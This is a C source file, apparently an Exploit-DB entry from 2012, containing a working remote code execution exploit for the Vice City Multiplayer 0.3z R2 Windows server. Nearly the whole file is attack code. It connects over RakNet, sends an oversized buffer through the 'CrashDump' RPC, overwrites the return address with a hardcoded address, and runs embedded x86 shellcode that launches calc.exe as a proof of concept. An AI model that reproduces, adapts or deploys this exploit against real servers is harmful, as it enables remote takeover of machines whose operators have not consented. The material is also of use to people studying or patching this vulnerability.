/*
Exploit Title: Vice City Multiplayer remote code execution (Server)
Date: 22/08/2012
Exploit Author: Sasuke78200 (Benjaa Toufik)
Software Link:
http://www.vicecitymultiplayer.com/downloads/03z_r2/server0.3zr2(pawn)(win)(updated2).zip
Version: 0.3z R2
Tested on: Windows XP SP3, Windows 7 Ultimate SP1, Windows Server 2003,
Windows Server 2008, it should work on all Windows.

Exploit-DB mirror: http://www.exploit-db.com/sploits/20758.tar.gz
*/

#include "main.h"

/* 
	Written by Sasuke78200
	http://sasuke78200.blogspot.fr/

 */


RakClientInterface* pClientInterface;


void Exploit()
{
	unsigned long iLen;
	unsigned char aBuffer[4096];
	RakNet::BitStream* pBitStream;

	unsigned char aShellCode[] = 
	{
		0xE8, 0x25, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEC, 
		0x80, 0x00, 0x00, 0x00, 0x6A, 0x01, 0x6A, 0x00,
		0x6A, 0x00, 0x53, 0x68, 0x78, 0x82, 0x44, 0x00, 
		0x6A, 0x00, 0xB8, 0x94, 0x61, 0x44, 0x00, 0xFF, 
		0x10, 0x6A, 0x00, 0xB8, 0x00, 0x61, 0x44, 0x00, 
		0xFF, 0x10, 0xE8, 0xD6, 0xFF, 0xFF, 0xFF, 0x63, 
		0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
/* Compiled version of */
		//USE32
	
		//_start:
		//	call _string

		//_begin:
		//	pop 	ebx
		//	sub 	esp, 0x80

		//	; ShellExecuteA(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
		//	push	1
		//	push	0
		//	push 	0
		//	push	ebx
		//	push	0x448278	; offset of "open" on the server
		//	push	0x00
		//	mov		eax, 0x446194
		//	call	[eax]

		//	; ExitProcess(0); To avoid a crash
		//	push	0
		//	mov		eax, 0x446100
		//	call	[eax]
	
		//_string:
		//	call _begin
		//	db "calc.exe"
		//	db 0
	};

	pBitStream = new RakNet::BitStream();

	memset(aBuffer, 0x49, sizeof(aBuffer));

	iLen = 588; // limit of the stack on Windows

	// New EIP (stack pointer)

	*(unsigned long*)&aBuffer[iLen] = 0x4165E6;		// Windows
	iLen += 4; // EIP
	*(unsigned long*)&aBuffer[iLen] = 0x90909090;
	iLen += 4;
	memcpy(&aBuffer[iLen], aShellCode, sizeof(aShellCode));
	iLen += sizeof(aShellCode);



	pBitStream->Write((unsigned int)iLen);
	pBitStream->Write((char*)aBuffer, iLen);


	pClientInterface->RPC("CrashDump", pBitStream, HIGH_PRIORITY, RELIABLE, 0, false, UNASSIGNED_NETWORK_ID, 0);
	delete pBitStream;
}

int main()
{

	Packet*	pPacket;

	pClientInterface = RakNetworkFactory::GetRakClientInterface();
	pClientInterface->Connect("127.0.0.1", 5192, 0, 0, 20);


	for(;;)
	{
		while((pPacket = pClientInterface->Receive()) != 0)
		{
			switch(pPacket->data[0])
			{
			case ID_CONNECTION_REQUEST_ACCEPTED:
				{
					puts("Connected ...");
					Exploit();
					break;
				}
			case ID_CONNECTION_LOST:
				{
					puts("Connection time out\nCode executed ? :)");
					break;
				}
			case ID_RECEIVED_STATIC_DATA:
				{
					break;
				}
			default:
				{
					printf("packet id %d received lenght %d bytes\n", pPacket->data[0], pPacket->length);
				}
			}

			pClientInterface->DeallocatePacket(pPacket);
		}


	}

	return 0;
}